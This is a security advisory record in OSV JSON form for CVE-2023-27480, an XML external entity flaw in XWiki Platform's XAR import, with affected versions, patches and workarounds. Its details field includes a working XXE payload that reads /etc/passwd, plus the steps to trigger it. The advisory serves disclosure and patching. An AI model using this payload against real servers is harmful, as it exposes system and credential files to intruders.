@@ -1,0 +1,107 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-gx4f-976g-7g6v",
+  "modified": "2023-03-08T17:19:30Z",
+  "published": "2023-03-08T17:19:30Z",
+  "aliases": [
+    "CVE-2023-27480"
+  ],
+  "summary": "XWiki Platform vulnerable to data leak via Improper Restriction of XML External Entity Reference",
+  "details": "### Impact\nAny user with edit rights on a document can trigger a XAR import on a forged XAR file, leading to the ability to display the content of any file on the XWiki server host.\n\nExample to reproduce:\n* Create a forget XAR file and inside it, have the following `package.xml` content:\n  ```xml\n  <?xml version=\"1.0\" encoding=\"UTF-8\"?>\n  <!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>\n\n  <package>\n  <infos>\n  <name>&xxe;</name>\n  <description> &xxe; Helper pages for creating and listing Class/Template/Sheets</description>\n  <licence></licence>\n  <author>XWiki.Admin</author>\n  ...\n  ```\n* Upload it onto a wiki page (e.g. `XXE`) as an attachment (e.g. `test.xar`).\n* Call the page using `http://localhost:8080/xwiki/bin/view/Main/XXE?sheet=XWiki.AdminImportSheet&file=test.xar`\n\nYou'll then notice that the displayed UI contains the content of the `/etc/passwd` file.\n\n### Patches\nThe vulnerability has been patched in XWiki 13.10.11, 14.4.7 and 14.10-rc-1.\n\n### Workarounds\nYou'd need to get XWiki Platform sources and apply the changes from https://github.com/xwiki/xwiki-platform/commit/e3527b98fdd8dc8179c24dc55e662b2c55199434 to the `XarPackage` java class and then copy the modified version to your `WEB-INF/classes` directory (or rebuild the `xwiki-platform-xar-model` maven module and replace the one found in `WEB-INF/lib/`).\n\n### References\n* https://github.com/xwiki/xwiki-platform/commit/e3527b98fdd8dc8179c24dc55e662b2c55199434\n* https://jira.xwiki.org/browse/XWIKI-20320\n\n### For more information\nIf you have any questions or comments about this advisory:\n*    Open an issue in [Jira XWiki.org](https://jira.xwiki.org/)\n*    Email us at [Security Mailing List](mailto:security@xwiki.org)\n",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Maven",
+        "name": "org.xwiki.platform:xwiki-platform-xar-model"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "1.1-milestone-3"
+            },
+            {
+              "fixed": "13.10.11"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "package": {
+        "ecosystem": "Maven",
+        "name": "org.xwiki.platform:xwiki-platform-xar-model"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "14.0"
+            },
+            {
+              "fixed": "14.4.7"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "package": {
+        "ecosystem": "Maven",
+        "name": "org.xwiki.platform:xwiki-platform-xar-model"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "14.5"
+            },
+            {
+              "fixed": "14.10-rc-1"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/xwiki/xwiki-platform/security/advisories/GHSA-gx4f-976g-7g6v"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-27480"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/xwiki/xwiki-platform/commit/e3527b98fdd8dc8179c24dc55e662b2c55199434"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/xwiki/xwiki-platform"
+    },
+    {
+      "type": "WEB",
+      "url": "https://jira.xwiki.org/browse/XWIKI-20320"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-611"
+    ],
+    "severity": "HIGH",
+    "github_reviewed": true,
+    "github_reviewed_at": "2023-03-08T17:19:30Z",
+    "nvd_published_at": "2023-03-07T19:15:00Z"
+  }
+}
